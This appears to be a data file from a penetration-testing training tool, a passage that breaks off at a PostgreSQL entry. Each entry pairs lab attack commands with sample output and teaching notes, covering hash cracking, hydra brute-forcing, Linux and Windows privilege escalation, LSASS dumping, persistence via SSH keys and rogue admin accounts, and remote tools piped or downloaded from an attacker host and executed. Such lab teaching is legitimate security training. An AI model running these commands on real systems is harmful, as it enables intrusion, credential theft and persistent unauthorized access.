      why: "A NetNTLMv2 hash caught by Responder or a relay differs from an NT hash in one crucial way: it cannot be passed, only cracked or relayed. So if you are not relaying, cracking is the only route, and a cracked password becomes a real login wherever that account is valid. Reach for it after a capture, and strip duplicates first, because Responder appends on every run.",
      cmd: 'hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        'JDOE::ACME:1122334455667788:A1B2...:Winter2024!',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'JDOE::ACME:1122334455667788:A1B2...:Winter2024!',
      teach: 'The NetNTLMv2 hash Responder captured cracks offline in hashcat mode 5600. A NetNTLMv2 hash CANNOT be passed (only cracked or relayed), so recover the password and it becomes a real login wherever that account is valid.',
    },
    'crack-shadow': {
      why: "A /etc/shadow entry you managed to read, through a SUID binary, a backup, or a misconfiguration, cracks offline to a local password that is very often reused for sudo or on another box. Reach for it whenever you get shadow read access. The crack is the easy part; the real value is testing that recovered password everywhere, because people reuse passwords constantly.",
      cmd: 'hashcat -m 1800 shadow.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        'root:$6$xyz$...:toor123',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'root:$6$xyz$...:toor123',
      teach: 'A $6$ hash from /etc/shadow is sha512crypt (mode 1800), slow by design, so lean on a good wordlist and rules. Crack root\'s hash and the privesc is done; crack a service user and you may unlock lateral moves.',
    },
    'crack-archive': {
      why: "A password-protected backup or export sitting in your loot almost always hides config files or credentials, which is exactly why someone locked it. Extract its hash with the matching *2john (zip2john, rar2john), crack it offline, then unpack it and read what is inside. Reach for it whenever you find a locked archive; it is a self-contained side quest that frequently hands you the next credential.",
      cmd: 'zip2john backup.zip > archive.hash && hashcat -m 17200 archive.hash rockyou.txt', tool: 'zip2john',
      output: [
        'backup.zip/config.bak:$pkzip2$...:hunter2',
        'Status...........: Cracked',
      ].join('\n'),
      signal: 'backup.zip/config.bak:$pkzip2$...:hunter2',
      teach: 'A password-protected archive you looted is just another crackable hash, zip2john/office2john extract it, hashcat breaks it. The contents are often the reason it was protected: credentials, keys, or the next foothold.',
    },
    'online-brute-ssh': {
      why: "Online brute-forcing is the loud, risky, last-resort option: reach for it only when SSH is reachable, you have an enumerated username list, and the quieter paths (loot, reuse, keys) are exhausted. It is noisy and can lock accounts, so it never runs on its own and the wordlist stays targeted. Prefer a short list of likely passwords against known-real users over a giant list against guesses.",
      cmd: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -t 4 ssh://10.10.10.10', tool: 'hydra',
      output: [
        '[DATA] attacking ssh://10.10.10.10:22/',
        '[22][ssh] host: 10.10.10.10   login: bmurphy   password: iloveyou',
        '1 of 1 target successfully completed, 1 valid password found',
      ].join('\n'),
      signal: '[22][ssh] host: 10.10.10.10   login: bmurphy   password: iloveyou',
      teach: 'When you have a real username but no password, a measured online brute against SSH can find a weak one. Keep the wordlist small and the rate sane (-t 4), lab accounts lock out too, and a found pair is an instant shell.',
    },
    'online-brute-ftp': {
      why: "FTP with no known credential is a classic hydra target, and a recovered FTP login frequently reuses onto SSH or the web, so the payoff reaches past FTP itself. Still, it is online brute-forcing: loud and lockout-prone, so treat it as a fallback after anonymous login and loot have failed. Keep the user list tight and the password list sensible; blasting rockyou at it is rarely the move.",
      cmd: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f ftp://10.10.10.10', tool: 'hydra',
      output: [
        '[DATA] attacking ftp://10.10.10.10:21/',
        '[21][ftp] host: 10.10.10.10   login: bob   password: ftp123',
      ].join('\n'),
      signal: '[21][ftp] host: 10.10.10.10   login: bob   password: ftp123',
      teach: 'Against a confirmed FTP service with a known user, a measured hydra run finds weak passwords, and always test anonymous first, it is free. A hit gives you file access, and often the files hold the next credential.',
    },
    'online-brute-rdp': {
      why: "A reachable RDP service with no credential can be sprayed, but RDP lockout policies bite hard, so go slow and spray one or two likely passwords across users rather than many passwords at one account. Reach for it only after the quieter options are gone. A valid RDP login is a full interactive desktop, which is the temptation, but the lockout risk makes this a careful, late-stage move.",
      cmd: 'hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -t 1 rdp://10.10.10.10', tool: 'hydra',
      output: [
        '[DATA] attacking rdp://10.10.10.10:3389/',
        '[3389][rdp] host: 10.10.10.10   login: admin   password: Password1',
      ].join('\n'),
      signal: '[3389][rdp] host: 10.10.10.10   login: admin   password: Password1',
      teach: 'A weak RDP password is an interactive desktop. Brute it only with a real username and a short list at -t 1, RDP lockout policies are unforgiving. A hit here is a full GUI session as that user.',
    },
    'crack-mscache2': {
      why: "Domain Cached Credentials v2 ($DCC2$) are what a laptop stores so a domain user can still log in when the DC is unreachable. They are deliberately slow to crack and, unlike NT hashes, cannot be passed, so cracking is the only path. Reach for them when you dump a workstation's secrets and find cached logons. A weak one still falls, and the plaintext is a genuine domain credential, worth the long crack.",
      cmd: 'hashcat -m 2100 dcc2.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
      output: [
        '$DCC2$10240#jdoe#a1b2c3...:Autumn2023!',
        'Status...........: Cracked',
      ].join('\n'),
      signal: '$DCC2$10240#jdoe#a1b2c3...:Autumn2023!',
      teach: 'Domain Cached Credentials (mscash2, mode 2100) are what a laptop stores so a domain user can log in offline. They crack slowly and cannot be passed (only cracked), but a recovered password is a real domain credential.',
    },

    // ============================ LINUX PRIVESC ============================
    'linux-enum': {
      why: "You escalate by finding the one thing that is wrong, not by recalling techniques, so this is where every Linux privesc starts. Run a scanner like linpeas for coverage, but read its output hunting for the single outlier: an odd SUID bit, a writable path in root's PATH, a password in a config. Do it the moment you land. The scanner finds a hundred things; your job is to spot the one that matters, so read with a question, not a checklist.",
      signal: '    (ALL) NOPASSWD: /usr/bin/find',
      teach: 'linpeas runs every local privesc check at once and colour-codes the leads, but it is not on the target, so you serve it from your box and pipe it straight into a shell (no file touches disk). A NOPASSWD sudo entry on a GTFOBins binary like find is a bright-green, near-certain path to root. Enumerate first; it points you at the real vector.',
      steps: [
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding linpeas.sh', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'linpeas', cmd: 'curl -sL http://10.10.14.5:8000/linpeas.sh | sh', output: [
          '[+] Sudo version 1.8.31',
          '[+] Checking sudo -l',
          '    (ALL) NOPASSWD: /usr/bin/find',
          '[+] SUID - Check easy privesc',
          '    /usr/bin/pkexec',
        ].join('\n') },
      ],
    },
    'sudo-abuse': {
      why: "`sudo -l` is the first command to run on any Linux foothold, because the answer is so often an instant win: a NOPASSWD entry on a binary GTFOBins knows how to escape (vim, find, awk, python) is root in one line. Reach for it immediately after enumeration. The pattern to learn is \"what can this binary be made to do beyond its intended job\", because that same idea reappears with SUID and capabilities.",
      cmd: 'sudo -l', tool: 'sh',
      output: [
        'Matching Defaults entries for www-data on target:',
        '    env_reset, mail_badpass',
        'User www-data may run the following commands on target:',
        '    (ALL) NOPASSWD: /usr/bin/find',
      ].join('\n'),
      signal: '    (ALL) NOPASSWD: /usr/bin/find',
      teach: 'sudo -l lists what you may run as another user without a password. NOPASSWD on a GTFOBins binary like find is a direct road to root (find . -exec /bin/sh \\; ). It is the first command to run on any Linux foothold.',
    },
    'writable-passwd': {
      why: "A world-writable /etc/passwd is a direct, exploit-free path to root: append a line for an account whose password hash you generated on your own box, then su to it. It turns up in labs more than it should. Reach for it whenever enumeration flags /etc/passwd as writable. There is no payload and nothing to crack, which makes it one of the cleanest escalations there is, just back up the file first.",
      cmd: 'ls -la /etc/passwd', tool: 'sh',
      output: [
        '-rw-rw-rw- 1 root root 2841 Jan  1 10:00 /etc/passwd',
      ].join('\n'),
      signal: '-rw-rw-rw- 1 root root 2841 Jan  1 10:00 /etc/passwd',
      teach: 'A world-writable /etc/passwd lets you add a root-UID user with a password hash you control (openssl passwd), then su to it. A single misconfigured permission bit is a direct path to root.',
    },
    'nfs-squash': {
      why: "An NFS share exported with no_root_squash trusts your remote root, so you mount it, drop a root-owned SUID shell on it from your side, then execute that shell on the target as root. Reach for it when enumeration or an NFS scan shows that export option. It lives half on your box and half on the target: you make the SUID binary as root locally and run it remotely, and understanding that split is the key to not fumbling it.",
      cmd: 'showmount -e 10.10.10.10', tool: 'showmount',
      output: [
        'Export list for 10.10.10.10:',
        '/srv/share  *(rw,no_root_squash)',
      ].join('\n'),
      signal: '/srv/share  *(rw,no_root_squash)',
      teach: 'no_root_squash on an NFS export means files you create as root on your own machine stay root-owned on the target. Mount it, drop a root-owned SUID shell, and run it on the box, a classic NFS privesc. Check the export options first.',
    },
    'lxc-lxd-escape': {
      why: "Membership in the lxd group is root without a password, and one of the most common intended paths on lab boxes: lxd lets you start a privileged container, mount the host filesystem inside it, and read or write anything as root. Reach for it the instant `id` shows the lxd group. The win is in who you already are, which is why checking your group memberships is the very first thing to do.",
      cmd: 'id', tool: 'sh',
      output: [
        'uid=1000(dev) gid=1000(dev) groups=1000(dev),110(lxd)',
      ].join('\n'),
      signal: 'uid=1000(dev) gid=1000(dev) groups=1000(dev),110(lxd)',
      teach: 'Membership in the lxd group is root-equivalent: you launch a privileged container that mounts the host filesystem and read or write anything as root. Like the docker group, lxd is a privilege nobody thinks of as one, always check your groups.',
    },
    'docker-socket': {
      why: "A writable /var/run/docker.sock, or the docker group, is root on the host by design: launch a container with the host filesystem attached and chroot into it. It is the lxd escape with a different daemon. Reach for it when the socket is writable or `id` shows the docker group. The idea that generalises: any group or socket that controls a root daemon is effectively root, so always check what your groups can talk to.",
      cmd: 'ls -la /var/run/docker.sock && id', tool: 'sh',
      output: [
        'srw-rw---- 1 root docker 0 Jan 1 10:00 /var/run/docker.sock',
        'uid=1000(dev) gid=1000(dev) groups=1000(dev),998(docker)',
      ].join('\n'),
      signal: 'uid=1000(dev) gid=1000(dev) groups=1000(dev),998(docker)',
      teach: 'Membership in the docker group is root-equivalent: you can start a container that mounts the host\'s / and read or write anything as root. The docker socket being reachable is the whole game.',
    },
    'suid-gtfobins': {
      why: "A SUID binary runs as its owner, usually root, so the question on every Linux box is whether there is a SUID binary that should not be one. The stock ones (su, mount, passwd) are expected noise; what you want is the outlier, a custom or out-of-place binary that GTFOBins has a shell-escape for. Reach for it during enumeration, and train your eye to find the odd one out, because that single misplaced SUID bit is a classic root.",
      cmd: 'find / -perm -4000 -type f 2>/dev/null', tool: 'sh',
      output: [
        '/usr/bin/passwd',
        '/usr/bin/sudo',
        '/usr/bin/find',
      ].join('\n'),
      signal: '/usr/bin/find',
      teach: 'A SUID binary runs as its owner (often root) no matter who starts it. Cross the list against GTFOBins, /usr/bin/find with the SUID bit is a one-liner to a root shell. Ignore the expected ones (passwd, sudo); hunt the unusual.',
    },
    'pspy-monitor': {
      why: "Root runs scheduled jobs that never appear in your crontab, and pspy watches process creation to reveal them without needing root. The gold is a script in a writable path that root runs on a timer, or a command leaking a credential on its arguments. Reach for it when enumeration hints that \"something runs periodically\" but you cannot see what. It is patience as a technique: let it watch, and the scheduled root job shows itself.",
      signal: '2026/09/17 10:41:01 CMD: UID=0  PID=4120  /bin/bash /opt/backup.sh',
      teach: 'pspy watches the process table without root, so it catches cron jobs and scheduled tasks you cannot see in crontab, but it is a binary you have to get onto the box first. Serve it from your box, pull it down and make it executable, then run it. A root job (UID=0) running every 2 minutes is a privesc lead: if you can write the script it runs, you run code as root.',
      steps: [
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding pspy64', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'pspy', cmd: 'wget http://10.10.14.5:8000/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy -pf -i 1000', output: [
          "Saved '/tmp/pspy' [3078592/3078592]",
          '2026/09/17 10:41:01 CMD: UID=0  PID=4120  /bin/bash /opt/backup.sh',
          '2026/09/17 10:43:01 CMD: UID=0  PID=4221  /bin/bash /opt/backup.sh',
        ].join('\n') },
      ],
    },
    'cron-abuse': {
      why: "Two classic root-via-cron bugs: a root cron job that runs a script you can write (edit it, wait, become root), and a root job running tar or rsync with a wildcard in a directory you control (you plant filenames that become command-line options). Reach for it when pspy or enumeration shows a root job touching anything you can write. The wildcard-injection trick especially is worth learning, because it looks harmless and is anything but.",
      cmd: 'cat /etc/crontab', tool: 'sh',
      output: [
        'SHELL=/bin/sh',
        '*/2 *   * * *   root    /opt/backup.sh',
        '# and /opt/backup.sh is world-writable',
      ].join('\n'),
      signal: '*/2 *   * * *   root    /opt/backup.sh',
      teach: 'A cron job that runs as root on a script you can write is a direct privesc: append a reverse shell or a SUID copy of bash, wait for the next run, and you are root. Check /etc/crontab, /etc/cron.*, and tar-wildcard jobs.',
    },
    'capabilities': {
      why: "Linux capabilities slice root's power into pieces, and a misplaced one is a shortcut to root: cap_setuid on python is an instant root shell, cap_dac_read_search reads any file including shadow, cap_sys_admin is nearly root outright. Reach for it during enumeration with getcap. It is the same \"what can this binary really do\" reasoning as SUID and sudo, just expressed through capabilities, so check it in the same pass.",
      cmd: 'getcap -r / 2>/dev/null', tool: 'sh',
      output: [
        '/usr/bin/python3.8 = cap_setuid+ep',
        '/usr/bin/ping = cap_net_raw+ep',
      ].join('\n'),
      signal: '/usr/bin/python3.8 = cap_setuid+ep',
      teach: 'File capabilities grant slices of root power without the SUID bit. cap_setuid+ep on python means it can set its UID to 0, one line (os.setuid(0)) and you are root. Always run getcap -r / on a Linux box.',
    },
    'linux-loot-hunt': {
      why: "Before the clever techniques, just go looking, because credentials sitting in plain sight escalate more boxes than any exploit: shell history, config files with passwords, other users' readable home directories, backups under /opt and /var, mail spools. Reach for it right after your enumeration sweep. The mindset is \"where would a lazy admin leave a password\", and the answer is usually a file you can already read.",
      cmd: 'grep -rils "password" /var/www /home 2>/dev/null', tool: 'sh',
      output: [
        '/var/www/html/config.php: $db_pass = "w3b4ppp4ss";',
        '/home/dev/.bash_history: mysql -u root -pSuperSecret123',
      ].join('\n'),
      signal: '/var/www/html/config.php: $db_pass = "w3b4ppp4ss";',
      teach: 'Once you have a shell, loot before you escalate. Config files, shell history, and web roots leak passwords constantly, and people reuse them, so a web app\'s DB password is often root\'s too. Grep widely for password, secret, and key.',
    },
    'linux-persistence': {
      why: "Once you are root, persistence buys a way back in that survives password resets and reboots, which matters in long engagements and when an exam permits re-entry. The low-profile options: your SSH key in root's authorized_keys, a cron job, a SUID backdoor. Reach for it only after you have rooted the box and need durable access. On a short lab it is optional; as a habit and a report note, it is still worth understanding.",
      signal: 'root@target:~#',
      teach: 'Labs revert and shells die. Adding your public key to authorized_keys gives you a stable, password-free way back in, far better than re-exploiting each time. On a real engagement, persistence is scoped and documented.',
      steps: [
        { where: 'host', tool: 'sh', cmd: "mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAA...you@kali' >> /root/.ssh/authorized_keys", output: [
          '# your public key is now appended to root\'s authorized_keys (no output on success)',
        ].join('\n') },
        { where: 'local', tool: 'ssh', cmd: 'ssh -i id_ed25519 root@10.10.10.10', output: [
          'Last login: Mon Jan  1 10:00:00 2024 from 10.10.14.5',
          'root@target:~#',
        ].join('\n') },
      ],
    },

    // ============================ WINDOWS PRIVESC ============================
    'windows-enum': {
      why: "Same principle as Linux: let winpeas give you coverage, then let your own judgment pick the one finding that matters. On lab Windows boxes the usual winners are a misconfigured service, a credential left in a file or the registry, or an abusable privilege. Reach for it the moment you land. The output is long and mostly noise, so read it hunting for the outlier, not top to bottom.",
      signal: 'SeImpersonatePrivilege: Enabled',
      teach: 'Start with the built-in whoami /priv (instant, nothing to stage), then run the deep sweep with winPEAS, which is an .exe you must get onto the box first. Serve it from your box and pull it over with certutil, then run it. SeImpersonate Enabled on a service account means a "potato" exploit gets you SYSTEM.',
      steps: [
        { where: 'host', tool: 'cmd', cmd: 'whoami /priv', output: [
          'Privilege Name                State',
          'SeImpersonatePrivilege        Enabled',
          'SeChangeNotifyPrivilege       Enabled',
        ].join('\n') },
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding winPEASx64.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'winpeas', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/winPEASx64.exe wp.exe & wp.exe', output: [
          'CertUtil: -URLCache command completed successfully.',
          'ÉÍÍÍÍ¹ Checking token privileges',
          '    SeImpersonatePrivilege: Enabled',
          'ÉÍÍÍÍ¹ Unquoted Service Paths',
          '    VulnSvc: C:\\Program Files\\Acme Agent\\service.exe',
        ].join('\n') },
      ],
    },
    'seimpersonate': {
      why: "Service accounts (IIS, MSSQL) almost always hold SeImpersonatePrivilege, and that privilege is a straight line to SYSTEM: the \"potato\" exploits trick a privileged service into authenticating, then impersonate its token. Reach for it the instant `whoami /priv` shows SeImpersonate enabled. It is the most reliable Windows service-account escalation there is, so checking your privileges is the first thing to do after a web or database foothold.",
      signal: 'nt authority\\system',
      teach: 'SeImpersonate lets a process impersonate a client that connects to it. The "potato" family (GodPotato, PrintSpoofer) tricks a SYSTEM service into connecting, then steals its token. The potato is an .exe, so the chain is: confirm the privilege, serve the binary from your box, pull it over with certutil and run it, and you are SYSTEM.',
      steps: [
        { where: 'host', tool: 'cmd', cmd: 'whoami /priv | findstr /i impersonate', output: 'SeImpersonatePrivilege        Impersonate a client after authentication  Enabled' },
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding GodPotato-NET4.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'godpotato', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/GodPotato-NET4.exe gp.exe & gp.exe -cmd "cmd /c whoami"', output: [
          '[*] CombaseModule: 0x7ff...',
          '[*] DispatchTable: 0x7ff...',
          '[*] Trigger RPCSS',
          'nt authority\\system',
        ].join('\n') },
      ],
    },
    'unquoted-service-path': {
      why: "When a service's path has spaces and no quotes (C:\\Program Files\\My App\\svc.exe), Windows tries C:\\Program.exe first, then C:\\Program Files\\My.exe, so if you can write to one of those spots you choose what runs as SYSTEM. Reach for it when enumeration lists an unquoted path you can write into. It is a tidy classic, the catch is needing write access to the right folder, so verify that before building the payload.",
      cmd: 'wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "c:\\windows\\\\"', tool: 'sh',
      output: [
        'VulnSvc    C:\\Program Files\\Acme Agent\\service.exe    Auto',
      ].join('\n'),
      signal: 'VulnSvc    C:\\Program Files\\Acme Agent\\service.exe    Auto',
      teach: 'An unquoted service path with spaces lets Windows try C:\\Program.exe, then C:\\Program Files\\Acme.exe, before the real binary. If you can write to one of those directories, drop your payload there and the service runs it, often as SYSTEM.',
    },
    'weak-service-permissions': {
      why: "If you can change a service's configuration or overwrite its executable, you decide what runs as SYSTEM the next time it starts, by pointing it at your own binary. accesschk finds services whose ACLs you can write. Reach for it when enumeration flags a modifiable service. Note you usually need to trigger a restart (or wait for a reboot), so part of the exploit is getting the service to start again.",
      signal: '        SERVICE_ALL_ACCESS',
      teach: 'accesschk (a Sysinternals .exe) finds services whose ACLs you can write, but you have to stage it first: serve it from your box, pull it over with certutil, then run it. SERVICE_ALL_ACCESS over a service means you can rewrite its binary path (sc config VulnSvc binpath= ...) to run any command and restart it, code execution as the service account, usually SYSTEM.',
      steps: [
        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding accesschk.exe', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
        { where: 'host', tool: 'accesschk', cmd: 'certutil -urlcache -f http://10.10.14.5:8000/accesschk.exe ac.exe & ac.exe -uwcqv someuser VulnSvc /accepteula', output: [
          'CertUtil: -URLCache command completed successfully.',
          'VulnSvc',
          '  RW someuser',
          '        SERVICE_ALL_ACCESS',
        ].join('\n') },
      ],
    },
    'alwaysinstallelevated': {
      why: "When AlwaysInstallElevated is set in both HKLM and HKCU, any MSI you run installs with SYSTEM rights, so you build an MSI that adds an admin or runs your command and launch it. Reach for it when enumeration shows both registry keys set to 1, both are required, one alone does nothing. It is a quick, reliable win when present, which is why winpeas checks for it specifically.",
      cmd: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', tool: 'sh',
      output: [
        'HKLM\\...\\Installer',
        '    AlwaysInstallElevated    REG_DWORD    0x1',
        '# HKCU is also 0x1',
      ].join('\n'),
      signal: '    AlwaysInstallElevated    REG_DWORD    0x1',
      teach: 'When AlwaysInstallElevated is 0x1 in BOTH HKLM and HKCU, any MSI you install runs as SYSTEM. Build a malicious MSI (msfvenom -f msi), run msiexec, and you escalate, a pure misconfiguration, no exploit needed.',
    },
    'dpapi-secrets': {
      why: "Windows encrypts saved credentials (RDP, scheduled tasks, browser passwords) under DPAPI masterkeys, which are themselves protected by the user's password hash, so once you have that user you can decrypt their stored secrets. Reach for it after you own a user account and suspect saved credentials. It turns \"I am this user\" into \"here is everything this user saved\", which often includes a path to a more privileged account.",
      cmd: "impacket-dpapi credential -file C:\\Users\\dev\\AppData\\...\\Credentials\\A1B2 -key 0x...", tool: 'impacket-dpapi',
      output: [
        '[CREDENTIAL]',
        'Target: LegacyGeneric:target=git',
        'Username: svc_build',
        'Unknown3: Bu1ld!2023',
      ].join('\n'),
      signal: 'Unknown3: Bu1ld!2023',
      teach: 'Windows DPAPI encrypts saved browser and app passwords with a key derived from the user\'s login. With that user\'s context (or their masterkey) you decrypt the blobs and recover cleartext credentials, often for other systems the user accessed.',
    },
    'stored-credentials': {
      why: "Windows hoards credentials in predictable places: Credential Manager, autologon registry entries, unattend and sysprep answer files, saved .rdp files, browser vaults, mRemoteNG configs. Reach for it on every Windows foothold, because a found credential beats any exploit and frequently belongs to a more privileged account. The skill is knowing the dozen places to look, so run through them deliberately rather than hoping winpeas catches them all.",
      cmd: 'cmdkey /list', tool: 'sh',
      output: [
        'Currently stored credentials:',
        '    Target: Domain:interactive=ACME\\administrator',
        '    Type: Domain Password',
      ].join('\n'),
      signal: '    Target: Domain:interactive=ACME\\administrator',
      teach: 'Windows caches credentials for convenience. cmdkey /list shows stored logins you can reuse with runas /savecred, sometimes an Administrator credential is sitting there for the taking, no cracking needed.',
    },
    'windows-old-hives': {
      why: "A leftover C:\\windows.old from an in-place upgrade, or any saved SAM/SYSTEM hive, holds old local-account hashes, and the local Administrator hash is frequently still valid. Pull the hives, dump them offline with secretsdump, then crack or pass the hash. Reach for it when you find windows.old or readable hive backups. It is a clean path to local admin that bypasses touching LSASS at all.",
      cmd: 'dir C:\\Windows.old\\Windows\\System32\\config', tool: 'sh',
      output: [
        'Directory of C:\\Windows.old\\Windows\\System32\\config',
        '01/08/2024  09:12            65,536 SAM',
        '01/08/2024  09:12         9,437,184 SYSTEM',
      ].join('\n'),
      signal: '01/08/2024  09:12            65,536 SAM',
      teach: 'A Windows.old folder from an in-place upgrade keeps old registry hives (SAM and SYSTEM) that a low-priv user can often read. Pull them and dump offline (secretsdump) for the local Administrator hash, then pass it.',
    },
    'wesng-patch-gaps': {
      why: "Older Windows hosts (2008, 2012, 7) are often escalated by a missing kernel patch rather than a misconfiguration, and wesng maps the gaps: feed it `systeminfo` and it lists the missing patches with matching exploits. Reach for it when the box is old and the misconfiguration checks came up empty. Treat its output as candidates to verify, because a kernel exploit can crash the box, so weigh the risk before firing one on something you need stable.",
      cmd: 'systeminfo', tool: 'sh',
      output: [
        'OS Name:          Microsoft Windows Server 2016 Standard',
        'OS Version:       10.0.14393 N/A Build 14393',
        'Hotfix(s):        3 Hotfix(s) Installed.',
      ].join('\n'),
      signal: 'OS Version:       10.0.14393 N/A Build 14393',
      teach: 'systeminfo gives the exact build and installed hotfixes. Feed it to wesng (Windows Exploit Suggester) and it lists the kernel exploits the box is missing. Confirm the build and architecture before running one, a wrong kernel exploit bluescreens the target.',
    },
    'windows-persistence': {
      why: "With admin or SYSTEM, persistence leaves a route back: a local admin account you control, a scheduled task, or a Run key. Labs rarely need it, but long engagements do, and it is a legitimate report note on real work. Reach for it only after you hold privilege and need durable access. Like the Linux case, it is optional on a short box but worth understanding as a technique and as something defenders watch for.",
      cmd: "net user obol_svc 'Str0ng!Passw0rd' /add && net localgroup administrators obol_svc /add", tool: 'sh',
      output: [
        'The command completed successfully.',
        'The command completed successfully.',
      ].join('\n'),
      signal: 'The command completed successfully.',
      teach: 'A local admin account you add is a durable way back onto a Windows box after a revert or reboot. On a real engagement this is scoped, logged, and cleaned up afterward; note what you create so you can remove it.',
    },
    'lsass-dump-onbox': {
      why: "LSASS holds the credentials of every user currently logged on, so with admin or SYSTEM you dump its memory and parse out hashes, tickets, and sometimes plaintext. The built-in comsvcs.dll method needs nothing uploaded; ship the .dmp to Kali and parse it there to keep noise down. Reach for it once you have admin and want to harvest more credentials, especially on a box where a domain admin may have logged in.",
      cmd: 'rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\lsass.dmp full', tool: 'cmd',
      output: [
        '# dump written; parse offline with pypykatz:',
        'Username: administrator   NT: 2b576acbe6b...',
      ].join('\n'),
      signal: 'Username: administrator   NT: 2b576acbe6b...',
      teach: 'LSASS holds the credentials of everyone logged in. With local admin you dump its memory and parse it offline (pypykatz) for NTLM hashes, including, on a shared box, domain admins. Those hashes feed pass-the-hash and lateral movement.',
    },
    'defense-enum': {
      why: "Before running anything loud on a Windows host, find out what is watching: PowerShell language mode, Defender's real-time state and its exclusion paths, any AppLocker policy. Reach for it first on any Windows foothold, because a Defender exclusion path is literally a folder where your tools will not be scanned, and the language mode tells you whether your PowerShell will even run. It is reconnaissance that shapes every later choice.",
      cmd: 'powershell -c "$ExecutionContext.SessionState.LanguageMode"', tool: 'powershell',
      output: [
        'ConstrainedLanguage',
      ].join('\n'),
      signal: 'ConstrainedLanguage',
      teach: 'Before you throw tooling at a Windows box, learn what is watching: Constrained Language Mode, AppLocker, and real-time protection all change what will run. Knowing the constraints up front saves you from burning a shell on something that was never going to execute.',
    },

    // ============================ DATABASES ============================
    'mysql-login': {
      why: "A reachable MySQL frequently accepts a credential you already found, a blank root password, or reused creds, and a session in is the door to the schema and, more importantly, the application's own user and password tables. Reach for it whenever you have a MySQL port and any plausible credential. Getting in is usually the easy part; the value is what the application stored in its own tables.",
      cmd: "mysql -h 10.10.10.10 -u root -p'toor' -e 'SELECT version();'", tool: 'mysql',
      output: [
        '+-------------------------+',
        '| version()               |',
        '+-------------------------+',
        '| 5.7.33-0ubuntu0.16.04.1 |',
        '+-------------------------+',
      ].join('\n'),
      signal: '| 5.7.33-0ubuntu0.16.04.1 |',
      teach: 'A successful MySQL login is a foothold of its own: from SQL you can read application secrets, write files to the web root with INTO OUTFILE, and sometimes reach the OS. Confirm the version first, it steers what is possible.',
    },
    'mysql-loot': {
      why: "Applications keep their own user rows and password hashes in the database, so once you have a session, dumping the user tables yields crackable hashes and, very often, admin credentials that reuse elsewhere. Reach for it immediately after a MySQL login. This is where a database foothold becomes an account: the app's own password table is frequently the shortest path to a real login on the box or the domain.",
      cmd: "mysql -h 10.10.10.10 -u root -p'toor' -e 'SELECT user,host,authentication_string FROM mysql.user;'", tool: 'mysql',
      output: [
        '+------------------+------+-------------------------------------------+',
        '| user             | host | authentication_string                     |',
        '+------------------+------+-------------------------------------------+',
        '| root             | %    | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |',
        '| webapp           | %    | *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 |',
        '+------------------+------+-------------------------------------------+',
      ].join('\n'),
      signal: '| root             | %    | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |',
      teach: 'Once you have a DB session, the mysql.user table holds every account\'s password hash (mode 300 for the *HEX form). Dump them and crack offline, database passwords are reused as system and domain passwords all the time.',
    },
    'mssql-login': {
      why: "MSSQL commonly accepts a domain credential or the `sa` account, and an authenticated SQL prompt is the gateway to enumeration and, with enough privilege, to running OS commands. Reach for it when you see MSSQL and hold any credential, or suspect a weak `sa`. Unlike MySQL, MSSQL's real prize is command execution, so logging in is step one toward a Windows foothold, not the goal itself.",
      cmd: 'mssqlclient.py acme.internal/svc_sql:P@ssw0rd2023@10.10.10.10 -windows-auth', tool: 'mssqlclient.py',
      output: [
        '[*] Encryption required, switching to TLS',
        '[*] ACME\\svc_sql  guest@master',
        "SQL> SELECT IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin;",
        'is_sysadmin : 1',
      ].join('\n'),
      signal: 'is_sysadmin : 1',
      teach: 'The first thing to check on an MSSQL login is IS_SRVROLEMEMBER(\'sysadmin\'). A 1 means you can re-enable xp_cmdshell and run OS commands, or impersonate other logins. Sysadmin on MSSQL is effectively a shell on the host.',
    },
    'mssql-xp-cmdshell': {
      why: "A sysadmin-level MSSQL login can enable and call xp_cmdshell to run OS commands as the SQL service account, which is a direct Windows foothold, and that account very often carries SeImpersonatePrivilege for the next step to SYSTEM. Reach for it once you confirm sysadmin rights. It is one of the cleanest database-to-shell paths on Windows, so the moment you hold `sa`, this is the move.",
      cmd: "mssqlclient.py ...@10.10.10.10 -q \"EXEC xp_cmdshell 'whoami'\"", tool: 'mssqlclient.py',
      output: [
        'output',
        '--------------------------------',
        'nt service\\mssqlserver',
      ].join('\n'),
      signal: 'nt service\\mssqlserver',
      teach: 'With sysadmin on MSSQL you re-enable xp_cmdshell and run OS commands as the SQL service account. The whoami output confirms code execution, the database just became a shell. From here, grab a reverse shell.',
    },
    'postgres-login': {
      why: "PostgreSQL may accept a default or reused credential, and a session opens database enumeration plus, on older versions, RCE through COPY FROM PROGRAM or large-object tricks. Reach for it when you see Postgres and have a plausible credential. Check the version, because the command-execution path depends on it: the same login is either \"just data\" or \"a shell\" depending on how old the server is.",
